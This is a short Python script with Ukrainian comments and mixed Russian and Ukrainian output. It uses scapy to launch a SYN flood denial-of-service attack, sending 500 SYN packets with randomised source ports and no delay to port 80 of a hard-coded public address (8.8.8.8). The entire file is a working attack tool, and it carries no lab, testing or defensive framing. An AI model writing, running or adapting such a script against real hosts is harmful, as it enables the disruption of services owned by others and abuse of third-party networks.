from scapy.all import IP, TCP, send, conf
import random
import time

# --- НАЛАШТУВАННЯ ---
target_ip = "8.8.8.8"  # Ціль (той же IP, що і минулого разу)
target_port = 80       # Атакуємо конкретний порт (зазвичай веб-сервер)
packet_count = 500     # Скільки пакетів відправити
# -----------------

print(f"[*] Начало SYN Flood атаки на {target_ip}:{target_port}...")
print(f"[*] Используемый интерфейс: {conf.iface}")

try:
    for i in range(packet_count):
        # Генеруємо випадковий вихідний порт, щоб пакети виглядали як від різних сесій
        sport = random.randint(1024, 65535)
        
        # Створюємо пакет з прапорцем "S" (SYN)
        packet = IP(dst=target_ip) / TCP(sport=sport, dport=target_port, flags="S")
        
        # Відправляємо пакет максимально швидко (без пауз)
        send(packet, verbose=False)
        
        if i % 100 == 0 and i > 0:
            print(f"[>] Відправлено {i} пакетів...")

    print(f"\n[+] Атака завершена. Відправлено {packet_count} SYN-пакетів.")
except Exception as e:
    print(f"[-] Помилка: {e}. Перевірте права адміністратора!")